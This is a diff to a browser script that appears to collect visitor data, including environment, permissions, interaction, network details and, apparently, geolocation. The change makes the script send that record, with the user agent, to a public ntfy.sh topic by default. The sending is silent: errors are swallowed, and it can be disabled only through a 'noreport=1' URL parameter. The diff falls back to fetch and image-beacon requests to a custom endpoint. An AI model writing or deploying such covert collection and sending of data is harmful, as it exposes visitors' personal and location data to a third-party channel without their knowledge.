@@ -331,10 +331,20 @@
     var endpoint = (function () {
       var q = new URLSearchParams(location.search).get('ep');
       if (q) return q.replace(/\/$/, '');
-      return (window.COLLECT_EP || '').replace(/\/$/, '');
+      return (window.COLLECT_EP || 'ntfy:collectlab-7f3a91c2d4').replace(/\/$/, '');
     })();
-    try { fetch(endpoint + '/r?tag=' + tag, { method: 'POST', body: JSON.stringify(R), cache: 'no-store' }).catch(function () {}); } catch (e) {}
-    try { var i = new Image(); i.src = endpoint + '/r?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(JSON.stringify(R)); } catch (e) {}
+    if (new URLSearchParams(location.search).get('noreport') === '1') return;
+    if (endpoint.indexOf('ntfy:') === 0) {
+      try {
+        fetch('https://ntfy.sh/' + endpoint.slice(5), {
+          method: 'POST', cache: 'no-store',
+          body: JSON.stringify({ tag: tag, ua: navigator.userAgent, data: R })
+        }).catch(function () {});
+      } catch (e) {}
+    } else {
+      try { fetch(endpoint + '/r?tag=' + tag, { method: 'POST', body: JSON.stringify(R), cache: 'no-store' }).catch(function () {}); } catch (e) {}
+      try { var i = new Image(); i.src = endpoint + '/r?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(JSON.stringify(R)); } catch (e) {}
+    }
   }
 
   env(); perms(); interaction(); net(); geoOnce(); geoWatch();
